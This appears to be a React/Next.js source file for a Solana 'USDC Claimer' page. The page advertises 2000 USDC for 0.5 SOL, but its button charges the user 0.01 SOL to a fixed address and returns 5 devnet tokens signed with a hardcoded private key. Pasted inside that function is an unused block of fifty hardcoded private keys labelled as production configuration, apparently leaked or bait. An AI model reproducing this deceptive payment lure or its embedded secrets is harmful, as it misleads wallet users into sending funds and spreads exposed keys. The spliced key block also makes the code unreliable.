/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "475ieakqdDR35zybpRa7AHDeA9UNZke5DsuNCCm9cYqCeen4LXQ5H59SKbauQaasYH6BLHitE31SnyPkfmHvBvXe"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3htdAbuuqLzHoCim5iFqvJq5ghHHjjp7dMn5XKbqaVr5c1uTqe32ahbLhR7n9AhmbFhJfjVgH7wfhpJZV7zaGfyJ",
  "key1": "5ReMgLBSdSqe9Tg88bUm1s7PRoSaZkEJGDdv1iFhZmJau3Mmn6wHxJDwTvUEBJTTTjLTGbE4yb3cWawtWRVCJiC",
  "key2": "4BaF8v5KMF4Z7GfLPHsc5bVobjbHmAagpAS2zzP6b17v3uv42MZoKdXr4amMKaDsw2Je2V7me263MWVVQ8hVSgkD",
  "key3": "28YtitwBGtC2UAjWaYNUBs25MMsPHL6MzVtNfSHAbYUXoCXTNQJ1vSpGLxCXYWzyq8Qpc6aUUJqDfgdHyyme4Mkh",
  "key4": "T6KPdAKNvfsjXAzLiyEKfFgKmpHgbie2mN2pag46zZJrGZSBNr41Bux6vdnW6LrHSLA4XRA2fw1EzqQG2dzLFsG",
  "key5": "378QRao2deKp8LhC5kSgBeKRGVntcevUSde8CG6m8YuiRHqbXTJmwVCC8TewoMaipUJ5tiQjQ1trukQN15YuWCmj",
  "key6": "5siYPCRL2uAvMfaEZ9WWDm5WTySKjTuBzwpvQjB95pWp5EgjiqNS1BPJbYMgM6HvQdnkRco3rmkND6dhdWkeW1Rm",
  "key7": "5Uo1AbtdXdc7ZUX8URgRqMfbLUtDDjvfVq26WeGc4W3hRaeUCpAFpe9Vr7zo1nvCYpLHoVWcqYkwAP8M441E9EvQ",
  "key8": "5gZgBkB2rjJtQoUGFRfX3HXBMqWJUGtARLtB7jzQBXqSDaBSmVgGETFT7YM6KnJRzj6gQDgfvYBm2W2yCyNPbehe",
  "key9": "4C7ug2894A2ssyFqHAWYMsCv47ZpNFzxuGVbp4x4tFM9uQihKJD79uvkipQceKe8YYPxAhhHTu9GeKEZHqmxHn1D",
  "key10": "4DihVdEU3ba4XtqD1wkwCuXDWLeGBBacC1GnFNd91X7r4K3XpNBxe3Jx5uRCWafai7LBT7UwgXH6uVMv9xangu57",
  "key11": "2dscWAynVc3dFBVLUuYzAENDb488F4JSXicESTvEqmeUTX5yQh5q7uXm3ijtMWDtcEcnw76XVemdFapDnPMoRXVN",
  "key12": "2DQCFrsUjuU8JFJKpvW5if1XnRJyC9Rdn6Vhi5u7jhVje7fW4fxeMBJ8eKt36ufVmtbBoXf8FhpkpDwUA2TiHdFL",
  "key13": "663gfvHhRD6PzWo3cfzRf1Y1H6bpLRgfvvbzFrqpg1mSpp3JSaJZtdKetyAk2pyX2wXBhdmZytWArnmpaStP6k7j",
  "key14": "4MfTW7PShWrLVsiGarQmJ1p42s8PKeZHuWP2xqrVsT2gLyyZCygdX6zU9d3KUGWBxvBgRuDj4ZBpgVXR2Skv5StX",
  "key15": "3m95FiUaYcUW2RGK49aX1U6fhvwzWazZTHatyLyK2BvsoYF434syzBUxW2g7m9T8fJXqfsrZyzZJjP5n53CEKrka",
  "key16": "2HDib5DCKqei9DoBd5ocGQEX4yHXkGxfnSxHTLn3FnHJbgTPbVtVhFjtZuUrAxEDwdJdTSj4PkVVMPPgWrhVRmqo",
  "key17": "5UR7QFRob2JeKzuJCsmcf35XUYP3p2aKyPsQe7nFuA5yHcAS5HTarrLcVyhAnPHcz2DHg3WmuoRmt9Ti4vhLX5WX",
  "key18": "3YhkG2tDDe2juzbJCEzojXD5tRybPoQ4DAYMxKfK8pJuDrr88HJPDhbshL8NAyeeYwgoZGvkYg5SvVU8RdZv3erV",
  "key19": "MFyNH8tygYwxKAv7fUVz4zVe9G5nFaH7QpzJtKSfNwqMZWxHNcotBDDMw7L7wNr5xxEzAbT3iT3jKjNu8dxg2SA",
  "key20": "5nYLnrHB3wYpU2eRTUbBfcidJTmDuKmF9YGBVKRjXpBb47av2RHrsFFytL9R6yc4Q8vPDHKpipsQpT6WwHWfZXb3",
  "key21": "KCTgwrxdjMp9iBpk8ZRaW12CvSm6e1AABVKzwvmmnHLLeddUfJGt28B41bnYacdqDWoLE4e11rF2xupcbjSUynx",
  "key22": "2YVcB3uxqWjZQ7J8yfLnVymCYZupEDme4Yyons6gHvZzX4p5yAg1Xe4kSDWHsGsnDiyTByhDVU2LN49YNcTZ8tSW",
  "key23": "4oGVvDpAoASZ564FwhHmUpNhatnmfsVrPV92hdEPdN7ZKVrejZkN3tzBez6h36CreXGbntrsbnaGciwhyVLz2DpD",
  "key24": "2cMs63Z74ZarmhAiWrJxpS79hc7SYou9E9pYbFX3zrb5Fb5ptG1Wy9BsDvUAbaMMWPu2fqEbuRH4udptDzmccAEo",
  "key25": "3TaPDhk65EUoGpMLSvJ8YchGQohdv7fXy4K7zKRctxDWu4w7PhVVk6QWhra5Lv2uyvR6SBMfFc9TKZaXdMqmuwia",
  "key26": "3M1vtmKMpB3JnEvyHCctjiXTnossvAaen34MyAMEAEewrHDqtBVzJHV7PhKe2D8mj4qXKLPM9ETH65QNqMiyQEwr",
  "key27": "3kWbSsEYGW42AGCG4gxYiweZPRQBWVVbMmu8XMbLHyxZMcyUx49K6UebeThZPutQH7wMxPPwacb93MUQ5bMzziKi",
  "key28": "4T9WEqfQprhGyD5cfWnBiufreWGp3tzAjaE3WvbVaC2Zgo4Nwck1kKBnzVYgnLT2SxCsQpzixmUiRKK7HYNeVRvC",
  "key29": "5YWQ967Fo4Z3PqbFeViiF7iUSP1wMjpdNGb3DXkfAkJtKJsAPzpNt453bRfZL4CN9QP8QCjmESssyr8myATJJKLr",
  "key30": "4xkWWxXzKkUsJSi1mks1Xmbvkg5qU7qvcGQ2tDLYkfm9sHuWbZDGAHM9sneHuDstQzsedBpqdJADo7uabwit5twx",
  "key31": "5VUBcqvw3Eoqfz7EUjSq1PTY5MFbP52QiBpiMRqeCK9RPdHxqcvR81cJV73ufX1jkxcsuJLd68XtQZPVsmg6GkSu",
  "key32": "3cLfshb23SebXhpuajGp72xrAWNzfYv2cCBM4wCXmRkwvgh7m9XLpGcGTaUJSAEpkvfQcatWVAomezexaJWTnWmm",
  "key33": "4HUXVUiuBePNyhtE8bSHfrZvQTfc8Vh3UVU6QwBroXSUBka9vW53sR1injq171YX2TMTFieHTxiVhi9LvkRY3Thu",
  "key34": "2AbVx6KiyADHPjYSbWazEV33Ba4jaZi3DC7RYVxTz5dJd8BTQCsbKdVRPUxFUPer9pM7E8WHPFMo2KmmyVn8BbbD",
  "key35": "4P3TStm8afUaapr9BFC5dcQANfXmcCHb9TvD3VcKYaYmdaruCENo5zChzDKmjcJWdxhDhGRi6yJcbz2XnMztfPfQ",
  "key36": "3wytE8UikwEf8WFAwtasXxmcQj5sjB48eepZyLsuGYXbTrfELYBd21i5jbrMdNj3jbFMi8oT2ZLmyzzm9vTAJ8hB",
  "key37": "tENZqzjiSocnqCWig4JULusJEXNmJc1Dsvkfu7aghiqjkpuZXzuTZA3nMrxb6ThdTSFPhK6mBpBYBvUxNv4W3UZ",
  "key38": "3MiMx1BNNMbfepw2JjEowuCoWFAjownWgEpe1Pe3Bctq9jvNxcsCT7aNu3PHBWHgDuv5DuHH9aQUWxNKkfJQetSK",
  "key39": "3iJprvTQQyhfwvb6yLhJpRagi4noxH3BgDky1wgBfPfNauMS4E5kzJAPb9qKYmWc4rmA92gm1yA6Fcr7hQ4V2u9v",
  "key40": "5KAx34KV31wTFD8D5mqFxuheTZHCwgeoVa56KdKNhzUriipHXEShWhJqrhorQP4cZVYdp1PM65Kkw7GmZiWsZwqE",
  "key41": "4Z4wHLXgsjH4NykWnQbJ7hN5YjtJ9oCcPiN55QzzdxLi4d94EAUTGtpUHfGZERGuZKZzjWBKLJ7ZJPGeB4jckm6C",
  "key42": "2JSbP1xwpx48HdMFCtUjjiHngfmmLz8VJcW4LU2nEak1asVpL3JdMcGXHd3uSvdCPF76aDvZSgBA9BtMLHxszqni",
  "key43": "5QR6BKReDVKJqYSgfaytWHZZcvP5GVhKaZvdsQrJhmPAmzT1NtSEXATJDC54SaVMiaZXJqoQ7Hq1r7uEFmJaAUkD",
  "key44": "YZ3owHuDCkT17Dfmpy7Sb3uyaSHmrmwsnzAVP6WgnZ8QKoUH6ncDAGcURCV2dxypQGf8z6tKYnSdvd4AgXmriyw",
  "key45": "24Um7vqEVxVu5BAsdsYXWRyi2ymJFjx4QqmWh3SibVW2dCLs3pdGtPqDtEAeyZQWUheNhyBAKbQWvPu5aCmQxnpW",
  "key46": "2mBpThtjFYAqTyzwuoyiEgJjR42SwhAX8iNAACLTfXJKoSM5uMJiSRtmouic61yaQQvn3AkP9PcK96r8g3KGx8Dg",
  "key47": "3699tnJocMqLCiUbgKr7qf3KvPR4ZDbjHfWeJNTv4jooBexfGxikvgsxsDqUaUt9PymygwtVKkRiDTuN1fJFiLdv",
  "key48": "2udHKFamyKcAHhocNk9ABnhPBWHVAZfGg63oAmPguvLhimoLhoQD2Swzj4sqFw4gMgkMd7KbDo254pdx49SUZAuN",
  "key49": "4koDMQHcVbP8ptTBzZ4Wt9PFgoFxun9JXTgUD9ubaFMDojqUF6reWEPnDxHZRUat78k8Xmo4gay7MtwCaZoSPJ7C"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
